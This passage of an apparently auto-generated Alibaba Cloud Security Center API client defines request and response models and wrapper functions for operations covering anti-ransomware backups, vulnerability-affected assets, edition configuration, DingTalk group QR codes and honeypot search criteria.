            "qtc_log": "F:\\\\\\\\database\\\\\\\\qtc_0.ldf"
      },
      "name": "qtc"
}'),
    }
  ](name='RecoverableInfoList', description='An array that consists of the backup snapshots.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
}

model DescribeUniRecoverableListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUniRecoverableListResponseBody(name='body'),
}

/**
 * @summary Queries the backup snapshots from which the data of a database can be restored.
 *
 * @param request DescribeUniRecoverableListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUniRecoverableListResponse
 */
async function describeUniRecoverableListWithOptions(request: DescribeUniRecoverableListRequest, runtime: Util.RuntimeOptions): DescribeUniRecoverableListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniRecoverableList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the backup snapshots from which the data of a database can be restored.
 *
 * @param request DescribeUniRecoverableListRequest
 * @return DescribeUniRecoverableListResponse
 */
async function describeUniRecoverableList(request: DescribeUniRecoverableListRequest): DescribeUniRecoverableListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniRecoverableListWithOptions(request, runtime);
}

model DescribeUniSupportRegionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniSupportRegion?: [ string ](name='UniSupportRegion', description='An array consisting of the region that is supported by anti-ransomware for databases.'),
}

model DescribeUniSupportRegionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUniSupportRegionResponseBody(name='body'),
}

/**
 * @summary Queries the region that is supported by anti-ransomware for databases.
 *
 * @param request DescribeUniSupportRegionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUniSupportRegionResponse
 */
async function describeUniSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeUniSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUniSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the region that is supported by anti-ransomware for databases.
 *
 * @return DescribeUniSupportRegionResponse
 */
async function describeUniSupportRegion(): DescribeUniSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniSupportRegionWithOptions(runtime);
}

model DescribeUserBackupMachinesResponseBody = {
  machines?: [ 
    {
      id?: long(name='Id', description='The ID of the anti-ransomware policy that is applied to the server.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy that is applied to the server.', example='policy_name_A'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the anti-ransomware policy is applied.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines', description='An array consisting of the servers to which the anti-ransomware policy is applied.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DescribeUserBackupMachinesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUserBackupMachinesResponseBody(name='body'),
}

/**
 * @summary Queries the information about the servers to which an anti-ransomware policy is applied.
 *
 * @param request DescribeUserBackupMachinesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUserBackupMachinesResponse
 */
async function describeUserBackupMachinesWithOptions(runtime: Util.RuntimeOptions): DescribeUserBackupMachinesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUserBackupMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the servers to which an anti-ransomware policy is applied.
 *
 * @return DescribeUserBackupMachinesResponse
 */
async function describeUserBackupMachines(): DescribeUserBackupMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBackupMachinesWithOptions(runtime);
}

model DescribeUserBaselineAuthorizationRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId', description='资产所有者ID。', example='1519712934213764'),
  sourceIp?: string(name='SourceIp', description='The ID of the asset owner.', example='1.2.3.4'),
}

model DescribeUserBaselineAuthorizationResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0AF20EB0-EBBC-4B94-9B84-F3BAFAC53EDE'),
  userBaselineAuthorization?: {
    status?: int32(name='Status', description='Indicates whether Security Center is authorized to run configuration checks on cloud services.

*   **0**: no. Security Center is not authorized to run configuration checks on cloud services.
*   **1**: yes. Security Center is authorized to run configuration checks on cloud services.', example='1'),
  }(name='UserBaselineAuthorization', description='The information about whether Security Center is authorized to run configuration checks on cloud services.'),
}

model DescribeUserBaselineAuthorizationResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUserBaselineAuthorizationResponseBody(name='body'),
}

/**
 * @summary The source IP address of the request.
 *
 * @param request DescribeUserBaselineAuthorizationRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUserBaselineAuthorizationResponse
 */
async function describeUserBaselineAuthorizationWithOptions(request: DescribeUserBaselineAuthorizationRequest, runtime: Util.RuntimeOptions): DescribeUserBaselineAuthorizationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserBaselineAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary The source IP address of the request.
 *
 * @param request DescribeUserBaselineAuthorizationRequest
 * @return DescribeUserBaselineAuthorizationResponse
 */
async function describeUserBaselineAuthorization(request: DescribeUserBaselineAuthorizationRequest): DescribeUserBaselineAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBaselineAuthorizationWithOptions(request, runtime);
}

model DescribeUserSettingRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='58.248.87.10'),
}

model DescribeUserSettingResponseBody = {
  alertLevels?: [ string ](name='AlertLevels', description='The severities of alerts. If this parameter is empty, no custom alerts are generated.'),
  invalidWarningKeepDays?: int32(name='InvalidWarningKeepDays', description='The number of days during which you want to retain invalid alerts.', example='30'),
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeUserSettingResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUserSettingResponseBody(name='body'),
}

/**
 * @summary Queries the settings of a custom baseline check policy.
 *
 * @param request DescribeUserSettingRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUserSettingResponse
 */
async function describeUserSettingWithOptions(request: DescribeUserSettingRequest, runtime: Util.RuntimeOptions): DescribeUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the settings of a custom baseline check policy.
 *
 * @param request DescribeUserSettingRequest
 * @return DescribeUserSettingResponse
 */
async function describeUserSetting(request: DescribeUserSettingRequest): DescribeUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserSettingWithOptions(request, runtime);
}

model DescribeUuidsByVulNamesRequest {
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is fixed. Valid values:

*   **y**: the vulnerability is fixed.
*   **n**: the vulnerability is not fixed.', example='n'),
  fieldName?: string(name='FieldName', description='The name of the search field that is used to query containers.', example='namespace'),
  fieldValue?: string(name='FieldValue', description='The value of the search field that is used to query containers.', example='cas-adad-qeqwe'),
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='11286014'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  level?: string(name='Level', description='The severity of the vulnerability. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,low'),
  necessity?: string(name='Necessity', description='The priority based on which the vulnerability is fixed. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset. Fuzzy match is supported.', example='10.7.'),
  searchTags?: string(name='SearchTags', description='The tags that are used to search for the vulnerability.', example='oval'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Separate multiple states with commas (,). Valid values:

*   **1**: unfixed
*   **2**: fix failed', example='1,4'),
  tag?: string(name='Tag', description='The tag of the vulnerability.', example='oval'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the ID of the asset', example='uuid'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability

This parameter is required.', example='cve'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerability is detected. Separate multiple IDs with commas (,).', example='vpc-uf6ssrvbrwe37ekw****,vpc-bp1aevy8sofi8mh1q****'),
  vulNames?: [ string ](name='VulNames', description='An array that consists of the names of vulnerabilities.

>  You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) operation to obtain the names of vulnerabilities.

This parameter is required.'),
}

model DescribeUuidsByVulNamesResponseBody = {
  machineInfoStatistics?: [ 
    {
      internetIp?: string(name='InternetIp', description='The public IP address of the server on which the exception was detected.', example='47.98.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the exception was detected.', example='172.18.XX.XX'),
      machineInstanceId?: string(name='MachineInstanceId', description='The instance ID of the server.', example='i-wz9gd1os5talju****'),
      machineIp?: string(name='MachineIp', description='The IP address of the server.', example='192.168.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='TestMachine'),
      os?: string(name='Os', description='The operating system that the server runs.', example='windows'),
      regionId?: string(name='RegionId', description='The region ID of the server.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='18375c64-eaa2-4702-92b0-4ee7******'),
    }
  ](name='MachineInfoStatistics', description='The statistics about the servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
  vulCount?: int32(name='VulCount', description='The total number of vulnerabilities on the server.', example='2'),
}

model DescribeUuidsByVulNamesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUuidsByVulNamesResponseBody(name='body'),
}

/**
 * @summary Queries a list of assets that support fixing based on vulnerability names.
 *
 * @param request DescribeUuidsByVulNamesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUuidsByVulNamesResponse
 */
async function describeUuidsByVulNamesWithOptions(request: DescribeUuidsByVulNamesRequest, runtime: Util.RuntimeOptions): DescribeUuidsByVulNamesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.level)) {
    query['Level'] = request.level;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUuidsByVulNames',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of assets that support fixing based on vulnerability names.
 *
 * @param request DescribeUuidsByVulNamesRequest
 * @return DescribeUuidsByVulNamesResponse
 */
async function describeUuidsByVulNames(request: DescribeUuidsByVulNamesRequest): DescribeUuidsByVulNamesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUuidsByVulNamesWithOptions(request, runtime);
}

model DescribeVendorListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57B795'),
  vendorNameList?: [ string ](name='VendorNameList', description='An array that consists of the service providers.'),
}

model DescribeVendorListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVendorListResponseBody(name='body'),
}

/**
 * @summary Queries the service providers whose assets can be added to Security Center.
 *
 * @param request DescribeVendorListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVendorListResponse
 */
async function describeVendorListWithOptions(runtime: Util.RuntimeOptions): DescribeVendorListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVendorList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the service providers whose assets can be added to Security Center.
 *
 * @return DescribeVendorListResponse
 */
async function describeVendorList(): DescribeVendorListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVendorListWithOptions(runtime);
}

model DescribeVersionConfigRequest {
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the Alibaba Cloud account that uses Security Center.

>  You can call the [GetUser](https://help.aliyun.com/document_detail/28681.html) operation to query the IDs of Alibaba Cloud accounts.', example='127608589417****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
}

model DescribeVersionConfigResponseBody = {
  agentlessCapacity?: long(name='AgentlessCapacity', description='The quota for agentless detection.

>  The agentless detection feature is unavailable for purchase. You can ignore this parameter.', example='10'),
  allowPartialBuy?: int32(name='AllowPartialBuy', description='Indicates whether the pay-as-you-go billing method is supported.

*   **0**: no
*   **1**: yes', example='1'),
  antiRansomwareService?: int32(name='AntiRansomwareService', description='Switch of anti-ransomware hosting service. Valid values:

*   **0**: off
*   **1**: on', example='1'),
  appWhiteList?: int32(name='AppWhiteList', description='Indicates whether the application whitelist feature is enabled. Valid values:

*   **0**: no
*   **2**: yes', example='2'),
  appWhiteListAuthCount?: long(name='AppWhiteListAuthCount', description='The quota for the application whitelist feature.

>  The quantity of servers that are allowed by the quota is deducted by one each time you apply an application whitelist to a server. After you enable the application whitelist feature, the quota is 20 by default.', example='20'),
  assetLevel?: int32(name='AssetLevel', description='The quota for servers that can be protected.', example='30'),
  cspmCapacity?: long(name='CspmCapacity', description='The purchased quota for configuration assessment. Unit: times/month.', example='10'),
  highestVersion?: int32(name='HighestVersion', description='The most advanced edition that is used. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition

>  If you purchase the Multi-version edition of Security Center, the value indicates the most advanced edition that is used in the Multi-version edition. If you do not purchase the Multi-version edition of Security Center, the value indicates the edition of Security Center.', example='1'),
  honeypotCapacity?: long(name='HoneypotCapacity', description='The purchased quota for the cloud honeypot feature.', example='20'),
  imageScanCapacity?: long(name='ImageScanCapacity', description='The purchased quota for the container image scan feature.', example='8954'),
  instanceId?: string(name='InstanceId', description='The ID of purchased Security Center.', example='sas-vg6hafdsafs****'),
  isNewContainerVersion?: boolean(name='IsNewContainerVersion', description='Indicates whether Security Center runs the latest version of the Ultimate edition.

*   **true**: yes
*   **false**: no', example='true'),
  isNewMultiVersion?: boolean(name='IsNewMultiVersion', description='Indicates whether Security Center runs the latest version of the Multi-version edition. Valid values:

*   **true**
*   **false**', example='true'),
  isOverBalance?: boolean(name='IsOverBalance', description='Indicates whether the number of existing servers exceeds the purchased quota. Valid values:

*   **false**: no
*   **true**: yes
>Notice: This parameter is deprecated. You can ignore it.', example='false'),
  isPostpay?: boolean(name='IsPostpay', description='Indicates whether the pay-as-you-go billing method is used. Valid values:

*   **false**
*   **true**', example='true'),
  isTrialVersion?: int32(name='IsTrialVersion', description='Indicates whether Security Center runs the free trial edition. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  lastTrailEndTime?: long(name='LastTrailEndTime', description='The timestamp when the last trial of Security Center ends. Unit: milliseconds.', example='1603934844000'),
  MVAuthCount?: int32(name='MVAuthCount', description='The total quota in the Multi-version edition of purchased Security Center.', example='5000'),
  MVUnusedAuthCount?: int32(name='MVUnusedAuthCount', description='The total remaining quota in the Multi-version edition of purchased Security Center.', example='40'),
  mergedVersion?: int32(name='MergedVersion', description='When both the annual/monthly and pay-as-you-go services of Cloud Security Center\\\\"s host and container security are activated, the higher protection version among the two is selected. Values: - **1**: Free Edition - **6**: Anti-Virus Edition - **5**: Advanced Edition - **3**: Enterprise Edition - **7**: Ultimate Edition', example='7'),
  newThreatAnalysis?: int32(name='NewThreatAnalysis', description='Indicates whether the new version of the threat analysis and response feature is enabled. With the new version, you can purchase the amount of log data that you want to add to the feature and log storage capacity. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  openTime?: long(name='OpenTime', description='The timestamp when Security Center is purchased. Unit: milliseconds.', example='1657244824669'),
  postPayHostVersion?: int32(name='PostPayHostVersion', description='When activating the pay-as-you-go service for host and container security, this represents the highest protection version for the already bound assets. The values are as follows: - **1**: Free Edition - **3**: Enterprise Edition - **5**: Advanced Edition - **6**: Anti-Virus Edition - **7**: Flagship Edition', example='7'),
  postPayInstanceId?: string(name='PostPayInstanceId', description='The instance ID of Security Center that uses the pay-as-you-go billing method.', example='postpay-sas-**'),
  postPayModuleSwitch?: string(name='PostPayModuleSwitch', description='The configuration of the pay-as-you-go module. Valid values:

*   **VUL**: vulnerability fixing module', example='{"VUL":1}'),
  postPayOpenTime?: long(name='PostPayOpenTime', description='The creation time of Security Center that uses the pay-as-you-go billing method.', example='1698915219000'),
  postPayStatus?: int32(name='PostPayStatus', description='The status of Security Center that uses the pay-as-you-go billing method. Valid values:

*   **1**: The instance runs as expected.
*   **2**: The instance is stopped due to overdue payments.', example='1'),
  raspCapacity?: long(name='RaspCapacity', description='The purchased quota for application protection. Unit: process/month.', example='10'),
  releaseTime?: long(name='ReleaseTime', description='The timestamp when the Security Center subscription ends. Unit: milliseconds.

>  If you do not renew the subscription within seven days after the expiration date, Security Center of a paid edition is automatically downgraded to Security Center Basic. In this case, you can no longer use the features of the paid edition or view the existing configurations or statistics such as DDoS alerts in Security Center. You must purchase Security Center of a paid edition to use relevant features. For more information, see [Purchase Security Center](https://help.aliyun.com/document_detail/42308.html).', example='1625846400000'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='C2DC96D2-DD2E-49D9-A28E-85590475DF55'),
  sasLog?: int32(name='SasLog', description='Indicates whether log analysis is purchased. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  sasScreen?: int32(name='SasScreen', description='Indicates whether the security screen feature is purchased. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  sdkCapacity?: long(name='SdkCapacity', description='The purchased quota for malicious file detection SDK. Unit: process/month.', example='100'),
  slsCapacity?: long(name='SlsCapacity', description='The log storage capacity that you purchase. Unit: GB. Valid values: 0 to 200000.', example='10240'),
  threatAnalysisCapacity?: long(name='ThreatAnalysisCapacity', description='The purchased log storage capacity for threat analysis. Unit: GB.', example='25'),
  threatAnalysisFlow?: int32(name='ThreatAnalysisFlow', description='The amount of log data that you purchase for the threat analysis and response feature. Unit: GB-day.', example='10'),
  userDefinedAlarms?: int32(name='UserDefinedAlarms', description='Indicates whether the custom alert feature is enabled. Valid values:

*   **0**: no
*   **2**: yes', example='0'),
  version?: int32(name='Version', description='The edition of purchased Security Center. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **8**: Multi-version edition
*   **10**: Value-added Plan edition', example='3'),
  vmCores?: int32(name='VmCores', description='The quota for the cores of servers that can be protected.', example='10'),
  vulFixCapacity?: long(name='VulFixCapacity', description='The purchased quota for vulnerability fixing. Unit: times/month.', example='10'),
  webLock?: int32(name='WebLock', description='Indicates whether the web tamper proofing feature is enabled. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  webLockAuthCount?: long(name='WebLockAuthCount', description='The quota for the web tamper proofing feature. The quantity of servers that are allowed by the quota is deducted by one each time a server is protected by the web tamper proofing feature. Valid values: 0 to N.

>  N indicates the number of servers that you own.', example='0'),
}

model DescribeVersionConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVersionConfigResponseBody(name='body'),
}

/**
 * @summary Queries the details about the edition of purchased Security Center.
 *
 * @param request DescribeVersionConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVersionConfigResponse
 */
async function describeVersionConfigWithOptions(request: DescribeVersionConfigRequest, runtime: Util.RuntimeOptions): DescribeVersionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVersionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about the edition of purchased Security Center.
 *
 * @param request DescribeVersionConfigRequest
 * @return DescribeVersionConfigResponse
 */
async function describeVersionConfig(request: DescribeVersionConfigRequest): DescribeVersionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVersionConfigWithOptions(request, runtime);
}

model DescribeVolDingdingMessageRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='1.2.XX.XX'),
}

model DescribeVolDingdingMessageResponseBody = {
  dingdingUrl?: string(name='DingdingUrl', description='The QR code address of the DingTalk group.', example='https://www.wikihow.com/images_en/thumb/4/48/Get-the-URL-for-Pictures-Step-4-Version-4.jpg/v4-728px-Get-the-URL-for-Pictures-Step-4-Version-4.jpg.webp'),
  requestId?: string(name='RequestId', description='The request ID.', example='7A437E93-47EE-548F-ABCE-13F89AA85585'),
}

model DescribeVolDingdingMessageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVolDingdingMessageResponseBody(name='body'),
}

/**
 * @summary Queries the QR code address of a DingTalk group.
 *
 * @param request DescribeVolDingdingMessageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVolDingdingMessageResponse
 */
async function describeVolDingdingMessageWithOptions(request: DescribeVolDingdingMessageRequest, runtime: Util.RuntimeOptions): DescribeVolDingdingMessageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVolDingdingMessage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the QR code address of a DingTalk group.
 *
 * @param request DescribeVolDingdingMessageRequest
 * @return DescribeVolDingdingMessageResponse
 */
async function describeVolDingdingMessage(request: DescribeVolDingdingMessageRequest): DescribeVolDingdingMessageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVolDingdingMessageWithOptions(request, runtime);
}

model DescribeVpcHoneyPotCriteriaRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model DescribeVpcHoneyPotCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='vpcRegionId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: You must manually enter the search condition.
*   **select**: You must select a search condition from the **Values** drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is **select**.

> If the value of **Type** is **input**, the value of this parameter is an empty string.', example='ap-southeast-2,eu-west-1'),
    }
  ](name='CriteriaList', description='An array that consists of the search conditions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FCE38ADB-7361-4212-AD87-A4514E4DF925'),
}

model DescribeVpcHoneyPotCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVpcHoneyPotCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries the search conditions that can be used to query honeypots.
 *
 * @param request DescribeVpcHoneyPotCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVpcHoneyPotCriteriaResponse
 */
async function describeVpcHoneyPotCriteriaWithOptions(request: DescribeVpcHoneyPotCriteriaRequest, runtime: Util.RuntimeOptions): DescribeVpcHoneyPotCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
